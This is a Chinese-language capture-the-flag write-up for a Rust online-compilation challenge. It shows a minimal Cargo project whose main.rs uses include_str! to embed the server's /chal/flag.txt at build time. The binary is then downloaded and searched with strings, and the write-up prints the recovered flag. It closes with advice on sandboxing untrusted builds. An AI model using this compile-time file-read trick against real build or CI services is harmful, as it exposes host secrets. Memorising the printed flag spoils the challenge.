# Rust Compilation Service 1

## 题目简述

网站接收一个 Cargo 项目 ZIP，在服务器上执行 cargo build，并允许下载生成的 debug 二进制。flag 位于 /chal/flag.txt。漏洞不需要运行用户程序：Rust 的 include_str! 会在编译期读取文件并把内容嵌入产物，因此不可信构建任务可以直接窃取构建主机上的秘密。

## 解题过程

准备最小 Cargo 项目，ZIP 根目录必须直接包含 Cargo.toml 和 src，而不能再套一层目录。src/main.rs 写为：

~~~rust
fn main() {
    println!("{}", include_str!("/chal/flag.txt"));
}
~~~

include_str! 是编译器内建宏，参数路径在运行 cargo build 的服务器上解析。编译成功后，服务端遍历 target/debug，找出非目录、非 .d 的产物并通过 /results/{id} 返回。下载该二进制后，本地直接运行或搜索字符串：

~~~powershell
./solve
strings ./solve | Select-String "maple{"
~~~

两种方式都会看到被编入只读数据段的内容：

~~~text
maple{rUSt_m4Cr0s_4r3_R34L_p0W3RfUl}
~~~

这里没有路径穿越，也不依赖上传文件名；问题是构建进程拥有读取 flag 的权限，同时把攻击者控制的产物回传。

## 方法总结

编译是不可信代码执行的一种形式。宏、build.rs、链接器脚本、编译器插件和依赖安装步骤都可能在构建期访问环境。在线构建服务必须将每个任务放进最小权限、无秘密、无持久凭据、受网络和文件系统隔离的临时沙箱，不能只禁止执行最终二进制。
